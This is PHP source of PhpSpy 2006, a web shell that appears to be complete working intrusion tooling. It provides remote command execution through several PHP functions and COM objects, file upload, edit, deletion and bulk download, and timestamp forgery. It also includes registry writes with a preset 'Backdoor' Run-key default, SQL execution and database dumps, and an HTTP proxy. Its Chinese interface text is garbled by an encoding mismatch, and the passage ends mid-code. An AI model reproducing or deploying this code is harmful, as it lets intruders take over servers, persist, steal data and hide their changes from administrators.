<?php
/*
+--------------------------------------------------------------------------+
| str_replace(".", "", "P.h.p.S.p.y") Version:2006                         |
| Codz by Angel                                                            |
| (c) 2004 Security Angel Team                                             |
| http://www.4ngel.net                                                     |
| ======================================================================== |
| Team:  http://www.4ngel.net                                              |
|        http://www.bugkidz.org                                            |
| Email: 4ngel@21cn.com                                                    |
| Date:  Mar 21st 2005                                                     |
| Thx All The Fantasy of Wickedness's members                              |
| Thx FireFox (http://www.molyx.com)                                       |
+--------------------------------------------------------------------------+
*/

error_reporting(7);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];

/*=====================  =====================*/

// ǷҪ֤,1ΪҪ֤,Ϊֱӽ.ѡЧ
$admin['check'] = "1";

// Ҫ֤,޸ĵ½
$admin['pass']  = "angel";

/*===================== ý =====================*/


//  register_globals = off Ļ¹
$onoff = (function_exists('ini_get')) ? ini_get('register_globals') : get_cfg_var('register_globals');

if ($onoff != 1) {
	@extract($_POST, EXTR_SKIP);
	@extract($_GET, EXTR_SKIP);
}

$self = $_SERVER['PHP_SELF'];
$dis_func = get_cfg_var("disable_functions");


/*===================== ֤ =====================*/
if($admin['check'] == "1") {
	if ($_GET['action'] == "logout") {
		setcookie ("adminpass", "");
		echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
		echo "<span style=\"font-size: 12px; font-family: Verdana\">עɹ......<p><a href=\"".$self."\">Զ˳򵥻˳ &gt;&gt;&gt;</a></span>";
		exit;
	}

	if ($_POST['do'] == 'login') {
		$thepass=trim($_POST['adminpass']);
		if ($admin['pass'] == $thepass) {
			setcookie ("adminpass",$thepass,time()+(1*24*3600));
			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
			echo "<span style=\"font-size: 12px; font-family: Verdana\">½ɹ......<p><a href=\"".$self."\">Զת򵥻 &gt;&gt;&gt;</a></span>";
			exit;
		}
	}
	if (isset($_COOKIE['adminpass'])) {
		if ($_COOKIE['adminpass'] != $admin['pass']) {
			loginpage();
		}
	} else {
		loginpage();
	}
}
/*===================== ֤ =====================*/

// ж magic_quotes_gpc ״̬
if (get_magic_quotes_gpc()) {
    $_GET = stripslashes_array($_GET);
	$_POST = stripslashes_array($_POST);
}

// 鿴PHPINFO
if ($_GET['action'] == "phpinfo") {
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() ѱ,鿴&lt;PHP&gt;";
	exit;
}

// ߴ
if (isset($_POST['url'])) {
	$proxycontents = @file_get_contents($_POST['url']);
	echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>ȡ URL ʧ</b></p></center></body>";
	exit;
}

// ļ
if (!empty($downfile)) {
	if (!@file_exists($downfile)) {
		echo "<script>alert('Ҫµļ!')</script>";
	} else {
		$filename = basename($downfile);
		$filename_info = explode('.', $filename);
		$fileext = $filename_info[count($filename_info)-1];
		header('Content-type: application/x-'.$fileext);
		header('Content-Disposition: attachment; filename='.$filename);
		header('Content-Description: PHP Generated Data');
		header('Content-Length: '.filesize($downfile));
		@readfile($downfile);
		exit;
	}
}

// ֱرݿ
if ($_POST['backuptype'] == 'download') {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("ݿʧ");
	@mysql_select_db($dbname) or die("ѡݿʧ");	
	$table = array_flip($_POST['table']);
	$result = mysql_query("SHOW tables");
	echo ($result) ? NULL : ": ".mysql_error();

	$filename = basename($_SERVER['HTTP_HOST']."_MySQL.sql");
	header('Content-type: application/unknown');
	header('Content-Disposition: attachment; filename='.$filename);
	$mysqldata = '';
	while ($currow = mysql_fetch_array($result)) {
		if (isset($table[$currow[0]])) {
			$mysqldata.= sqldumptable($currow[0]);
			$mysqldata.= $mysqldata."\r\n";
		}
	}
	mysql_close();
	exit;
}

// Ŀ¼
$pathname=str_replace('\\','/',dirname(__FILE__)); 

// ȡǰ·
if (!isset($dir) or empty($dir)) {
	$dir = ".";
	$nowpath = getPath($pathname, $dir);
} else {
	$dir=$_GET['dir'];
	$nowpath = getPath($pathname, $dir);
}

// ж϶д
$dir_writeable = (dir_writeable($nowpath)) ? "д" : "д";
$phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\" target=\"_blank\">PHPINFO()</a>" : "";
$reg = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=reg\">ע</a>" : "";

$tb = new FORMS;

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>PhpSpy Ver 2006</title>
<style type="text/css">
body,td {
	font-family: "Tahoma";
	font-size: "12px";
	line-height: "150%";
}
.smlfont {
	font-family: "Tahoma";
	font-size: "11px";
}
.INPUT {
	FONT-SIZE: "12px";
	COLOR: "#000000";
	BACKGROUND-COLOR: "#FFFFFF";
	height: "18px";
	border: "1px solid #666666";
	padding-left: "2px";
}
.redfont {
	COLOR: "#A60000";
}
a:link,a:visited,a:active {
	color: "#000000";
	text-decoration: underline;
}
a:hover {
	color: "#465584";
	text-decoration: none;
}
.top {BACKGROUND-COLOR: "#CCCCCC"}
.firstalt {BACKGROUND-COLOR: "#EFEFEF"}
.secondalt {BACKGROUND-COLOR: "#F5F5F5"}
</style>
<SCRIPT language=JavaScript>
function CheckAll(form) {
	for (var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
function really(d,f,m,t) {
	if (confirm(m)) {
		if (t == 1) {
			window.location.href='?dir='+d+'&deldir='+f;
		} else {
			window.location.href='?dir='+d+'&delfile='+f;
		}
	}
}
</SCRIPT>
</head>

<body style="table-layout:fixed; word-break:break-all">
<center>
<?php
$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td><td align="right"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');
$tb->tdbody('<a href="?action=logout">עỰ</a> | <a href="?action=dir">PhpSpyĿ¼</a> | <a href="?action=phpenv">PHP</a> | <a href="?action=proxy">ߴ</a>'.$reg.$phpinfo.' | <a href="?action=shell">WebShell</a> | <a href="?action=sql">SQL Query</a> | <a href="?action=sqlbak">MySQL Backup</a>');
$tb->tablefooter();
?>
<hr width="775" noshade>
<table width="775" border="0" cellpadding="0">
<?
$tb->headerform(array('method'=>'GET','content'=>'<p>·: '.$pathname.'<br>ǰĿ¼('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>תĿ¼: '.$tb->makeinput('dir').' '.$tb->makeinput('','ȷ','','submit').' ֧־··'));

$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'ϴļǰĿ¼: '.$tb->makeinput('uploadfile','','','file').' '.$tb->makeinput('doupfile','ȷ','','submit').$tb->makeinput('uploaddir',$dir,'','hidden')));

$tb->headerform(array('action'=>'?action=editfile&dir='.urlencode($dir),'content'=>'½ļڵǰĿ¼: '.$tb->makeinput('editfile').' '.$tb->makeinput('createfile','ȷ','','submit')));

$tb->headerform(array('content'=>'½Ŀ¼ڵǰĿ¼: '.$tb->makeinput('newdirectory').' '.$tb->makeinput('createdirectory','ȷ','','submit')));
?>
</table>
<hr width="775" noshade>
<?php
/*===================== ִв ʼ =====================*/
echo "<p><b>\n";
// ɾļ
if (!empty($delfile)) {
	if (file_exists($delfile)) {
		echo (@unlink($delfile)) ? $delfile." ɾɹ!" : "ļɾʧ!";
	} else {
		echo basename($delfile)." ļѲ!";
	}
}

// ɾĿ¼
elseif (!empty($deldir)) {
	$deldirs="$dir/$deldir";
	if (!file_exists("$deldirs")) {
		echo "$deldir Ŀ¼Ѳ!";
	} else {
		echo (deltree($deldirs)) ? "Ŀ¼ɾɹ!" : "Ŀ¼ɾʧ!";
	}
}

// Ŀ¼
elseif (($createdirectory) AND !empty($_POST['newdirectory'])) {
	if (!empty($newdirectory)) {
		$mkdirs="$dir/$newdirectory";
		if (file_exists("$mkdirs")) {
			echo "Ŀ¼Ѵ!";
		} else {
			echo (@mkdir("$mkdirs",0777)) ? "Ŀ¼ɹ!" : "ʧ!";
			@chmod("$mkdirs",0777);
		}
	}
}

// ϴļ
elseif ($doupfile) {
	echo (@copy($_FILES['uploadfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfile']['name']."")) ? "ϴɹ!" : "ϴʧ!";
}

// ༭ļ
elseif ($_POST['do'] == 'doeditfile') {
	if (!empty($_POST['editfilename'])) {
		$filename="$editfilename";
		@$fp=fopen("$filename","w");
		echo $msg=@fwrite($fp,$_POST['filecontent']) ? "дļɹ!" : "дʧ!";
		@fclose($fp);
	} else {
		echo "Ҫ༭ļ!";
	}
}

// ༭ļ
elseif ($_POST['do'] == 'editfileperm') {
	if (!empty($_POST['fileperm'])) {
		$fileperm=base_convert($_POST['fileperm'],8,10);
		echo (@chmod($dir."/".$file,$fileperm)) ? "޸ĳɹ!" : "޸ʧ!";
		echo " ļ ".$file." ޸ĺΪ: ".substr(base_convert(@fileperms($dir."/".$file),10,8),-4);
	} else {
		echo "Ҫõ!";
	}
}

// ļ
elseif ($_POST['do'] == 'rename') {
	if (!empty($_POST['newname'])) {
		$newname=$_POST['dir']."/".$_POST['newname'];
		if (@file_exists($newname)) {
			echo "".$_POST['newname']." Ѿ,һ!";
		} else {
			echo (@rename($_POST['oldname'],$newname)) ? basename($_POST['oldname'])." ɹΪ ".$_POST['newname']." !" : "ļ޸ʧ!";
		}
	} else {
		echo "Ҫĵļ!";
	}
}

// ¡ʱ
elseif ($_POST['do'] == 'domodtime') {
	if (!@file_exists($_POST['curfile'])) {
		echo "Ҫ޸ĵļ!";
	} else {
		if (!@file_exists($_POST['tarfile'])) {
			echo "Ҫյļ!";
		} else {
			$time=@filemtime($_POST['tarfile']);
			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." ޸ʱɹΪ ".date("Y-m-d H:i:s",$time)." !" : "ļ޸ʱ޸ʧ!";
		}
	}
}

// Զʱ
elseif ($_POST['do'] == 'modmytime') {
	if (!@file_exists($_POST['curfile'])) {
		echo "Ҫ޸ĵļ!";
	} else {
		$year=$_POST['year'];
		$month=$_POST['month'];
		$data=$_POST['data'];		
		$hour=$_POST['hour'];
		$minute=$_POST['minute'];
		$second=$_POST['second'];
		if (!empty($year) AND !empty($month) AND !empty($data) AND !empty($hour) AND !empty($minute) AND !empty($second)) {
			$time=strtotime("$data $month $year $hour:$minute:$second");
			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." ޸ʱɹΪ ".date("Y-m-d H:i:s",$time)." !" : "ļ޸ʱ޸ʧ!";
		}
	}
}

// MYSQL
elseif ($connect) {
	if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {
		echo "ݿӳɹ!";
		mysql_close();
	} else {
		echo mysql_error();
	}
}

// ִSQL
elseif ($_POST['do'] == 'query') {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("ݿʧ");
	@mysql_select_db($dbname) or die("ѡݿʧ");
	$result = @mysql_query($_POST['sql_query']);
	echo ($result) ? "SQLɹִ!" : ": ".mysql_error();
	mysql_close();
}

// ݲ
elseif ($_POST['do'] == 'backupmysql') {
	if (empty($_POST['table']) OR empty($_POST['backuptype'])) {
		echo "ѡݵݱͱݷʽ!";
	} else {
		if ($_POST['backuptype'] == 'server') {
			@mysql_connect($servername,$dbusername,$dbpassword) or die("ݿʧ");
			@mysql_select_db($dbname) or die("ѡݿʧ");	
			$table = array_flip($_POST['table']);
			$filehandle = @fopen($path,"w");
			if ($filehandle) {
				$result = mysql_query("SHOW tables");
				echo ($result) ? NULL : ": ".mysql_error();
				while ($currow = mysql_fetch_array($result)) {
					if (isset($table[$currow[0]])) {
						sqldumptable($currow[0], $filehandle);
						fwrite($filehandle,"\n\n\n");
					}
				}
				fclose($filehandle);
				echo "ݿѳɹݵ <a href=\"".$path."\" target=\"_blank\">".$path."</a>";
				mysql_close();
			} else {
				echo "ʧ,ȷĿļǷпдȨ!";
			}
		}
	}
}

//  PS:ļ̫ܷǳ
// Thx : С
elseif($downrar) {
	if (!empty($dl)) {
		$dfiles="";
		foreach ($dl AS $filepath=>$value) {
			$dfiles.=$filepath.",";
		}
		$dfiles=substr($dfiles,0,strlen($dfiles)-1);
		$dl=explode(",",$dfiles);
		$zip=new PHPZip($dl);
		$code=$zip->out;		
		header("Content-type: application/octet-stream");
		header("Accept-Ranges: bytes");
		header("Accept-Length: ".strlen($code));
		header("Content-Disposition: attachment;filename=".$_SERVER['HTTP_HOST']."_Files.tar.gz");
		echo $code;
		exit;
	} else {
		echo "ѡҪصļ!";
	}
}

// Shell.Application г
elseif(($_POST['do'] == 'programrun') AND !empty($_POST['program'])) {
	$shell= &new COM('Sh'.'el'.'l.Appl'.'ica'.'tion');
	$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);
	echo ($a=='0') ? "Ѿɹִ!" : "ʧ!";
}

// 鿴PHPò״
elseif(($_POST['do'] == 'viewphpvar') AND !empty($_POST['phpvarname'])) {
	echo "ò ".$_POST['phpvarname']." : ".getphpcfg($_POST['phpvarname'])."";
}

// ȡע
elseif(($regread) AND !empty($_POST['readregname'])) {
	$shell= &new COM('WSc'.'rip'.'t.Sh'.'ell');
	var_dump(@$shell->RegRead($_POST['readregname']));
}

// дע
elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype']) AND !empty($_POST['regval'])) {
	$shell= &new COM('W'.'Scr'.'ipt.S'.'hell');
	$a = @$shell->RegWrite($_POST['writeregname'], $_POST['regval'], $_POST['regtype']);
	echo ($a=='0') ? "дעֵɹ!" : "д ".$_POST['regname'].", ".$_POST['regval'].", ".$_POST['regtype']." ʧ!";
}

// ɾע
elseif(($regdelete) AND !empty($_POST['delregname'])) {
	$shell= &new COM('WS'.'cri'.'pt.S'.'he'.'ll');
	$a = @$shell->RegDelete($_POST['delregname']);
	echo ($a=='0') ? "ɾעֵɹ!" : "ɾ ".$_POST['delregname']." ʧ!";
}

else {
	echo " <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel</a> С angel [<a href=\"http://www.bugkidz.org\" target=\"_blank\">BST</a>] , <a href=\"http://www.4ngel.net\" target=\"_blank\">www.4ngel.net</a> °汾.";
}

echo "</b></p>\n";
/*===================== ִв  =====================*/

if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == "dir")) {
	$tb->tableheader();
?>
  <tr bgcolor="#cccccc">
    <td align="center" nowrap width="27%"><b>ļ</b></td>
	<td align="center" nowrap width="16%"><b></b></td>
    <td align="center" nowrap width="16%"><b>޸</b></td>
    <td align="center" nowrap width="11%"><b>С</b></td>
    <td align="center" nowrap width="6%"><b></b></td>
    <td align="center" nowrap width="24%"><b></b></td>
  </tr>
<?php
// Ŀ¼б
$dirs=@opendir($dir);
$dir_i = '0';
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="1"){
		if($file!=".." && $file!=".")	{
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
			$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);
			echo "<tr class=".getrowbg().">\n";
			echo "  <td style=\"padding-left: 5px;\">[<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">&lt;dir&gt;</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$dirperm</a></td>\n";
			echo "  <td align=\"center\" nowrap><a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($file)."','ȷҪɾ $file Ŀ¼? \\n\\nĿ¼ǿ,˴βɾĿ¼µļ!','1')\">ɾ</a></td>\n";
			echo "</tr>\n";
			$dir_i++;
		} else {
			if($file=="..") {
				echo "<tr class=".getrowbg().">\n";
				echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">ϼĿ¼</a></td>\n";
				echo "</tr>\n";
			}
		}
	}
}// while
@closedir($dirs); 
?>
<tr bgcolor="#cccccc">
  <td colspan="6" height="5"></td>
</tr>
<FORM action="" method="POST">
<?
// ļб
$dirs=@opendir($dir);
$file_i = '0';
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="0"){		
		$size=@filesize($filepath);
		$size=$size/1024 ;
		$size= @number_format($size, 3);
		if (@filectime($filepath) == @filemtime($filepath)) {
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
		} else {
			$ctime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filectime($filepath))."</span>";
			$mtime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filemtime($filepath))."</span>";
		}
		@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);
		echo "<tr class=".getrowbg().">\n";
		echo "  <td style=\"padding-left: 5px;\">";
		echo "<INPUT type=checkbox value=1 name=dl[$filepath]>";
		echo "<a href=\"$filepath\" target=\"_blank\">$file</a></td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
		echo "  <td align=\"right\" nowrap class=\"smlfont\"><span class=\"redfont\">$size</span> KB</td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$fileperm</a></td>\n";
		echo "  <td align=\"center\" nowrap><a href=\"?downfile=".urlencode($filepath)."\"></a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">༭</a> | <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($filepath)."','ȷҪɾ $file ļ?','2')\">ɾ</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($filepath)."\"></a> | <a href=\"?action=newtime&dir=".urlencode($dir)."&file=".urlencode($filepath)."\">ʱ</a></td>\n";
		echo "</tr>\n";
		$file_i++;
	}
}// while
@closedir($dirs); 
$tb->tdbody('<table width="100%" border="0" cellpadding="2" cellspacing="0" align="center"><tr><td>'.$tb->makeinput('chkall','on','onclick="CheckAll(this.form)"','checkbox','30','').' '.$tb->makeinput('downrar','ѡļ','','submit').'</td><td align="right">'.$dir_i.' Ŀ¼ / '.$file_i.' ļ</td></tr></table>','center',getrowbg(),'','','6');

echo "</FORM>\n";
echo "</table>\n";
}// end dir

elseif ($_GET['action'] == "editfile") {
	if(empty($newfile)) {
		$filename="$dir/$editfile";
		$fp=@fopen($filename,"r");
		$contents=@fread($fp, filesize($filename));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}else{
		$editfile=$newfile;
		$filename = "$dir/$editfile";
	}
	$action = "?dir=".urlencode($dir)."&editfile=".$editfile;
	$tb->tableheader();
	$tb->formheader($action,'½/༭ļ');
	$tb->tdbody('ǰļ: '.$tb->makeinput('editfilename',$filename).' ļļ');
	$tb->tdbody($tb->maketextarea('filecontent',$contents));
	$tb->makehidden('do','doeditfile');
	$tb->formfooter('1','30');
}//end editfile

elseif ($_GET['action'] == "rename") {
	$nowfile = (isset($_POST['newname'])) ? $_POST['newname'] : basename($_GET['fname']);
	$action = "?dir=".urlencode($dir)."&fname=".urlencode($fname);
	$tb->tableheader();
	$tb->formheader($action,'޸ļ');
	$tb->makehidden('oldname',$dir."/".$nowfile);
	$tb->makehidden('dir',$dir);
	$tb->tdbody('ǰļ: '.basename($nowfile));
	$tb->tdbody('Ϊ: '.$tb->makeinput('newname'));
	$tb->makehidden('do','rename');
	$tb->formfooter('1','30');
}//end rename

elseif ($_GET['action'] == "fileperm") {
	$action = "?dir=".urlencode($dir)."&file=".$file;
	$tb->tableheader();
	$tb->formheader($action,'޸ļ');
	$tb->tdbody('޸ '.$file.' Ϊ: '.$tb->makeinput('fileperm',substr(base_convert(fileperms($dir.'/'.$file),10,8),-4)));
	$tb->makehidden('file',$file);
	$tb->makehidden('dir',urlencode($dir));
	$tb->makehidden('do','editfileperm');
	$tb->formfooter('1','30');
}//end fileperm

elseif ($_GET['action'] == "newtime") {
	$action = "?dir=".urlencode($dir);
	$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
	$tb->tableheader();
	$tb->formheader($action,'¡ļ޸ʱ');
	$tb->tdbody("޸ļ: ".$tb->makeinput('curfile',$file,'readonly')."  Ŀļ: ".$tb->makeinput('tarfile','·ļ'),'center','2','30');
	$tb->makehidden('do','domodtime');
	$tb->formfooter('','30');
	$tb->formheader($action,'Զļ޸ʱ');
	$tb->tdbody('<br><ul><li>ЧʱͷΧǴӸʱ 1901  12  13   20:45:54  2038 1  19  ڶ 03:14:07<br>(ڸ 32 λзСֵֵ)</li><li>˵: ȡ 01  30 ֮, ʱȡ 0  24 ֮, ֺȡ 0  60 ֮!</li></ul>','left');
	$tb->tdbody('ǰļ: '.$file);
	$tb->makehidden('curfile',$file);
	$tb->tdbody('޸Ϊ: '.$tb->makeinput('year','1984','','text','4').'  '.$tb->makeselect(array('name'=>'month','option'=>$cachemonth,'selected'=>'October')).'  '.$tb->makeinput('data','18','','text','2').'  '.$tb->makeinput('hour','20','','text','2').' ʱ '.$tb->makeinput('minute','00','','text','2').'  '.$tb->makeinput('second','00','','text','2').' ','center','2','30');
	$tb->makehidden('do','modmytime');
	$tb->formfooter('1','30');
}//end newtime

elseif ($_GET['action'] == "shell") {
	$action = "??action=shell&dir=".urlencode($dir);
	$tb->tableheader();
	$tb->tdheader('WebShell Mode');

	if (substr(PHP_OS, 0, 3) == 'WIN') {
		$program = isset($_POST['program']) ? $_POST['program'] : "c:\winnt\system32\cmd.exe";
		$prog = isset($_POST['prog']) ? $_POST['prog'] : "/c net start > ".$pathname."/log.txt";
		echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
		$tb->tdbody('޻г  ļ: '.$tb->makeinput('program',$program).' : '.$tb->makeinput('prog',$prog,'','text','40').' '.$tb->makeinput('','Run','','submit'),'center','2','35');
		$tb->makehidden('do','programrun');
		echo "</form>\n";
	}

	echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
	$tb->tdbody('ʾ:ȫ,дļ.Եõȫ.');
	
	$execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','wscript'=>'Wscript.Shell') : array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen');

	$tb->tdbody('ѡִк: '.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' : '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));
?>
  <tr class="secondalt">
    <td align="center"><textarea name="textarea" cols="100" rows="25" readonly><?php
	if (!empty($_POST['command'])) {
		if ($execfunc=="system") {
			system($_POST['command']);
		} elseif ($execfunc=="passthru") {
			passthru($_POST['command']);
		} elseif ($execfunc=="exec") {
			$result = exec($_POST['command']);
			echo $result;
		} elseif ($execfunc=="shell_exec") {
			$result=shell_exec($_POST['command']);
			echo $result;	
		} elseif ($execfunc=="popen") {
			$pp = popen($_POST['command'], 'r');
			$read = fread($pp, 2096);
			echo $read;
			pclose($pp);
		} elseif ($execfunc=="wscript") {
			$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die("PHP Create COM WSHSHELL failed");
			$exec = $wsh->exec ("cm"."d.e"."xe /c ".$_POST['command']."");
			$stdout = $exec->StdOut();
			$stroutput = $stdout->ReadAll();
			echo $stroutput;
		} else {
			system($_POST['command']);
		}
	}
	?></textarea></td>
  </tr>  
  </form>
</table>
<?php
}//end shell

elseif ($_GET['action'] == "reg") {
	$action = '?action=reg';
	$regname = isset($_POST['regname']) ? $_POST['regname'] : 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber';
	$registre = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Backdoor';
	$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\winnt\backdoor.exe';
	$delregname = $_POST['delregname'];
	$tb->tableheader();
	$tb->formheader($action,'ȡע');
	$tb->tdbody('ֵ: '.$tb->makeinput('readregname',$regname,'','text','100').' '.$tb->makeinput('regread','ȡ','','submit'),'center','2','50');
	echo "</form>";

	$tb->formheader($action,'дע');
	$cacheregtype = array('REG_SZ'=>'REG_SZ','REG_BINARY'=>'REG_BINARY','REG_DWORD'=>'REG_DWORD','REG_MULTI_SZ'=>'REG_MULTI_SZ','REG_EXPAND_SZ'=>'REG_EXPAND_SZ');
	$tb->tdbody('ֵ: '.$tb->makeinput('writeregname',$registre,'','text','56').' : '.$tb->makeselect(array('name'=>'regtype','option'=>$cacheregtype,'selected'=>$regtype)).' ֵ:  '.$tb->makeinput('regval',$regval,'','text','15').' '.$tb->makeinput('regwrite','д','','submit'),'center','2','50');
	echo "</form>";

	$tb->formheader($action,'ɾע');
	$tb->tdbody('ֵ: '.$tb->makeinput('delregname',$delregname,'','text','100').' '.$tb->makeinput('regdelete','ɾ','','submit'),'center','2','50');
	echo "</form>";
	$tb->tablefooter();
}//end reg

elseif ($_GET['action'] == "proxy") {
	$action = '?action=proxy';
	$tb->tableheader();
	$tb->formheader($action,'ߴ','proxyframe');
	$tb->tdbody('<br><ul><li>ñܽʵּ򵥵 HTTP ,ʾʹ·ͼƬӼCSSʽ.</li><li>ñܿͨĿURL,֧ SQL Injection ̽ԼĳЩַ.</li><li>ñ URL,ĿµIP¼ : '.$_SERVER['REMOTE_ADDR'].'</li></ul>','left');
	$tb->tdbody('URL: '.$tb->makeinput('url','http://www.4ngel.net','','text','100').' '.$tb->makeinput('','','','submit'),'center','1','40');
	$tb->tdbody('<iframe name="proxyframe" frameborder="0" width="765" height="400" marginheight="0" marginwidth="0" scrolling="auto" src="http://www.4ngel.net"></iframe>');
	echo "</form>";
	$tb->tablefooter();
}//end proxy

elseif ($_GET['action'] == "sql") {
	$action = '?action=sql';
	$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
	$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
	$dbpassword = $_POST['dbpassword'];
	$dbname = $_POST['dbname'];
	$sql_query = $_POST['sql_query'];
	$tb->tableheader();
	$tb->formheader($action,'ִ SQL ');
	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','','','submit'));
	$tb->tdbody($tb->maketextarea('sql_query',$sql_query,'85','10'));
	$tb->makehidden('do','query');
	$tb->formfooter('1','30');
}//end sql query

elseif ($_GET['action'] == "sqlbak") {
	$action = '?action=sqlbak';
	$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
	$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
	$dbpassword = $_POST['dbpassword'];
	$dbname = $_POST['dbname'];
	$tb->tableheader();
	$tb->formheader($action,' MySQL ݿ');
	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','','','submit'));
	@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname);
    $tables = @mysql_list_tables($dbname);
    while ($table = @mysql_fetch_row($tables)) {
		$cachetables[$table[0]] = $table[0];
    }
    @mysql_free_result($tables);
	if (empty($cachetables)) {
		$tb->tdbody('<b>ûݿ or ǰݿûκݱ</b>');
	} else {
		$tb->tdbody('<table border="0" cellpadding="3" cellspacing="1"><tr><td valign="top">ѡ:</td><td>'.$tb->makeselect(array('name'=>'table[]','option'=>$cachetables,'multiple'=>1,'size'=>15,'css'=>1)).'</td></tr><tr nowrap><td><input type="radio" name="backuptype" value="server" checked> ·:</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td colspan="2"><input type="radio" name="backuptype" value="download"> ֱص (ʺСݿ)</td></tr></table>');
		$tb->makehidden('do','backupmysql');
		$tb->formfooter('0','30');
	}
	$tb->tablefooter();
	@mysql_close();
}//end sql backup

elseif ($_GET['action'] == "phpenv") {
	$upsize=get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "ϴ";
